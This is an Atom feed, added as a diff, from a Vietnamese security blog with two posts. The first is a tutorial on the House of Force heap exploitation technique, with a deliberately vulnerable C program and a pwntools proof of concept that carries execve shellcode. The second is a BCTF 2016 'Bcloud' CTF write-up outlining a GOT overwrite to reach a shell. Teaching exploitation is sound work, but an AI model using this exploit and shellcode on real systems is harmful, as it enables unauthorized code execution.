@@ -1,0 +1,324 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[HarDToBelieve's Blog]]></title>
+  <link href="http://hardtobelieve.github.io/atom.xml" rel="self"/>
+  <link href="http://hardtobelieve.github.io/"/>
+  <updated>2016-05-14T00:14:54+07:00</updated>
+  <id>http://hardtobelieve.github.io/</id>
+  <author>
+    <name><![CDATA[HarDToBelieve]]></name>
+    <email><![CDATA[tuanit96@gmail.com]]></email>
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[House of Force]]></title>
+    <link href="http://hardtobelieve.github.io/blog/2016/03/24/house-of-force/"/>
+    <updated>2016-03-24T21:31:51+07:00</updated>
+    <id>http://hardtobelieve.github.io/blog/2016/03/24/house-of-force</id>
+    <content type="html"><![CDATA[<p>House of force là 1 trong 6 phương pháp được nhắc đến trong <a href="https://github.com/Malformation/Notes/blob/master/MallocMaleficarum.txt">Malloc Maleficarum</a>. Một kỹ thuật khai thác lỗ hổng ở bộ nhớ heap rất hay và vẫn được sử dụng cho đến tận bây giờ</p>
+
+<!--more-->
+
+
+<h1>Bài toán</h1>
+
+<p>Giả sử ta có đoạn code sau:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// gcc HouseOfForce.c -z execstack</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>  <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;What&#39;s your name?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">256</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Hello %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">n</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Size of infos: &quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">scanf</span> <span class="p">(</span><span class="s">&quot;%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">n</span><span class="p">);</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">info</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">n</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">info</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Size of wisdom: &quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">scanf</span> <span class="p">(</span><span class="s">&quot;%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">);</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">wish</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">n</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">wish</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;God bless you! %s&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">info</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">wish</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Điều kiện để ta có thể sử dụng House of Force (HoF) là cần tối thiểu 3 lần malloc:</p>
+
+<ul>
+<li>Malloc 1: Ta có thể điều khiển được topchunk ( biết địa chỉ của nó và có thể thay đổi giá trị ).</li>
+<li>Malloc 2: Quản lý được size khi malloc.</li>
+<li>Malloc 3: Thực hiện khai thác lỗ hổng.</li>
+</ul>
+
+
+<p>Trước tiên ta cần hiểu cách hoạt động của Topchunk. Đây là 1 thành phần có khả năng cấp phát bộ nhớ khi free list chunk còn trống hoặc không đủ cho yêu cầu từ người dùng. Topchunk luôn nằm sau heap sau cùng, nên ở  lần call thứ nhất, nếu ta biết đc địa chỉ heap ở lần thứ nhất này thì  chỉ việc cộng với size của nó sẽ ra đc địa chỉ size của topchunk, cộng  thêm 4 byte sẽ ra đc địa chỉ đầu tiên của vùng nhớ thuộc topchunk. Đoạn code của hàm int_malloc như sau:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kt">void</span><span class="o">*</span> <span class="nf">_int_malloc</span><span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">bytes</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="n">INTERNAL_SIZE_T</span> <span class="n">nb</span><span class="p">;</span>             <span class="cm">/* normalized request size */</span>
+</span><span class='line'>  <span class="n">mchunkptr</span>       <span class="n">victim</span><span class="p">;</span>         <span class="cm">/* inspected/selected chunk */</span>
+</span><span class='line'>  <span class="n">INTERNAL_SIZE_T</span> <span class="n">size</span><span class="p">;</span>           <span class="cm">/* its size */</span>
+</span><span class='line'>  <span class="n">mchunkptr</span>       <span class="n">remainder</span><span class="p">;</span>      <span class="cm">/* remainder from a split */</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">long</span>   <span class="n">remainder_size</span><span class="p">;</span> <span class="cm">/* its size */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">checked_request2size</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="p">[...]</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">victim</span> <span class="o">=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">size</span> <span class="o">=</span> <span class="n">chunksize</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">size</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">nb</span> <span class="o">+</span> <span class="n">MINSIZE</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">remainder_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="n">nb</span><span class="p">;</span>
+</span><span class='line'>      <span class="n">remainder</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span> <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>
+</span><span class='line'>      <span class="n">set_head</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span> <span class="o">|</span> <span class="n">PREV_INUSE</span> <span class="o">|</span> <span class="p">(</span><span class="n">av</span><span class="o">!=&amp;</span><span class="n">main_arena</span> <span class="o">?</span> <span class="nl">NON_MAIN_ARENA</span> <span class="p">:</span> <span class="mi">0</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">set_head</span><span class="p">(</span><span class="n">remainder</span><span class="p">,</span> <span class="n">remainder_size</span> <span class="o">|</span> <span class="n">PREV_INUSE</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">check_malloced_chunk</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+</span><span class='line'>      <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">perturb_byte</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span><span class='line'>          <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
+</span><span class='line'>      <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="p">[...]</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Để có thể sử dụng được topchunk, kích thước của nó phải lớn hơn kích thước mà người dùng yêu cầu. Sau đó, topchunk sẽ bị giảm đi một lượng bằng đúng kích thước người dùng yêu cầu và topchunk sẽ được đặt ở. &lt;địa chỉ topchunk cũ> + kích thước Ta có thể thấy vì địa chỉ topchunk là một số nguyên 4 byte, vậy nếu ta cộng một lượng mà kết quả vượt quá MAX_INT thì địa chỉ sẽ bị quay vòng lại ( 2&rsquo;s complement ). Như vậy, ta có thể điều khiển được giá trị trả về của hàm malloc ở lần sau.</p>
+
+<p>Khai thác
+Đầu tiên, ta sẽ lấp đầy bộ nhớ vừa được phát và sau đó, để đơn đơn giản ta sẽ đặt kích thước của topchunk là 0xffffffff.  Ngoài ra khi ta malloc(n) thì chương trình sẽ trả lại một vùng nhớ có độ lớn là ((n + 4 + 7) &amp; ~7)để chứa metadata của heap + data của người dùng, ta có thể dùng công thức này để tính toán vị trí của topchunk</p>
+
+<p><img src="http://hardtobelieve.github.io/assets/hof1.png" alt="Heap memory" /></p>
+
+<p>Sau đó, ta sẽ yêu cầu cấp phát một lượng byte sao cho malloc sẽ trả về đúng địa chỉ ta cần (GOT, code section, &hellip;), ví dụ ở đây ta sẽ ghi đè lên hàm printf vì sau khi malloc lần cuối chương trình có gọi hàm này.</p>
+
+<p><img src="http://hardtobelieve.github.io/assets/hof2.png" alt="GOT table" /></p>
+
+<p>Lần malloc cuối, ta chỉ việc viết đè lên đó bất cứ thứ gì. Tuy nhiên ở chương trình này, địa chỉ GOT của hàm printf không chia hết cho 8, trong khi hàm malloc luôn trả về một số nguyên 4 byte chia hết cho 8, nên ta phải thêm padding vào trước đó</p>
+
+<h1>Proof of Concept</h1>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">1928</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x31\xc9\xcd\x80</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">nops</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">260</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+</span><span class='line'><span class="n">max_size</span> <span class="o">=</span> <span class="mh">0xffffffff</span>
+</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x804a00c</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="mh">0x804b110</span>
+</span><span class='line'><span class="n">dummy</span> <span class="o">=</span> <span class="mh">0xdeadbeaf</span>
+</span><span class='line'><span class="n">new_request</span> <span class="o">=</span> <span class="mi">256</span>
+</span><span class='line'><span class="n">first_heap</span> <span class="o">=</span> <span class="mh">0x804b008</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">nops</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">max_size</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">dummy</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">new_request</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">dummy</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">first_heap</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong><em>Chú ý</em></strong>: Khi lấy địa chỉ để hàm malloc trả về, ta phải trừ đi 0x8 byte do metadata của heap. Cũng chính vì lấy đi 0x8 byte nên phương thức này sẽ làm hỏng 2 địa chỉ liền kề địa chỉ ta cần lấy. Ví dụ nếu ta điền vào bảng GOT, HoF sẽ làm hỏng 2 hàm liên tiếp trên đó, nên chương trình có thể sẽ bị SIGSEV trước khi đến được nơi ta khai thác lỗ hổng</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Bcloud - BCTF 2016]]></title>
+    <link href="http://hardtobelieve.github.io/blog/2016/03/24/bcloud-bctf-2016/"/>
+    <updated>2016-03-24T21:31:51+07:00</updated>
+    <id>http://hardtobelieve.github.io/blog/2016/03/24/bcloud-bctf-2016</id>
+    <content type="html"><![CDATA[<p>Đề bài cho 1 file ELF 32bit</p>
+
+<!--more-->
+
+
+<p>Đầu tiên, ta có thể thấy ở hàm nhập &ldquo;name&rdquo;</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">sub_80487A1</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>  <span class="p">...</span>
+</span><span class='line'>  <span class="n">sub_804868D</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40u</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">dword_804B0CC</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v2</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">...</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Hàm readn (sub_804868D) tự động thêm null byte, nên sau hàm này ta sẽ có</p>
+
+<blockquote><p>s = 64 byte + null</p></blockquote>
+
+<p>Tuy nhiên trên stack lại có cấu trúc</p>
+
+<blockquote><p>[char[64] s][char* v2]</p></blockquote>
+
+<p>nên sau khi gọi malloc, thì địa chỉ heap (4 byte) được gán vào v2, đè vào null byte của s, do đó strcpy sẽ copy tổng cộng là (64 byte s + 4 byte  v2), dẫn đến leak được heap.</p>
+
+<p><img src="http://hardtobelieve.github.io/assets/bcloud1.png" alt="After filling the heap" /></p>
+
+<p>Ở hàm lấy &ldquo;org&rdquo; và &ldquo;host&rdquo;, cũng với lỗi tương tự, nhưng do không có hàm in trả lại chuỗi nên ta không leak được thông tin gì. Tuy nhiên, ta lại có thể viết đè lên meta-data của heap chunk mà xin cấp phát bộ nhớ sau đó. Nhưng tại bước này chỉ có 3 heap đc malloc, vậy vị trí đó chính là size của topchunk</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">sub_804884E</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>  <span class="p">...</span>
+</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Org:&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">sub_804868D</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Host:&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">sub_804868D</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40u</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40u</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">dword_804B0C8</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v2</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">dword_804B148</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v4</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">...</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ta để ý rằng, vì không có null byte kết thúc chuỗi &ldquo;org&rdquo; sẽ bị nối tiếp với chuỗi &ldquo;host&rdquo;, dù chuỗi host chỉ xin cấp phát 0x40 byte</p>
+
+<p><img src="http://hardtobelieve.github.io/assets/bcloud2.png" alt="Serie of &quot;host&quot; and &quot;org&quot;" /></p>
+
+<p>Đến bước này, ta đã đủ điều kiện để thực hiện House of Force, một cách thức khai thác lỗi được nhắc đến trong Malloc Maleficarum. Ta sẽ khai thác như sau:</p>
+
+<ul>
+<li>Nhập &ldquo;host&rdquo; có giá trị 0xffffffff, như vậy size của topchunk là 0xffffffff</li>
+<li>Tạo một note mới bằng hàm &ldquo;New&rdquo;, kích thước là</li>
+</ul>
+
+
+<blockquote><p>địa chỉ got - địa chỉ heap - 0x8 ( metadata của heap )</p></blockquote>
+
+<p>Ở đây ta chọn thay hàm atoi bằng printf để có thể khai thác lỗi format string</p>
+
+<ul>
+<li>Leak địa chỉ libc</li>
+<li>Sử dụng chức năng &ldquo;Edit&rdquo;, sửa nội dung note thứ nhất thành địa chỉ libc + offset_system</li>
+<li>Gửi chuỗi &ldquo;/bin/sh&rdquo; và sẽ nhận được shell</li>
+</ul>
+
+]]></content>
+  </entry>
+  
+</feed>
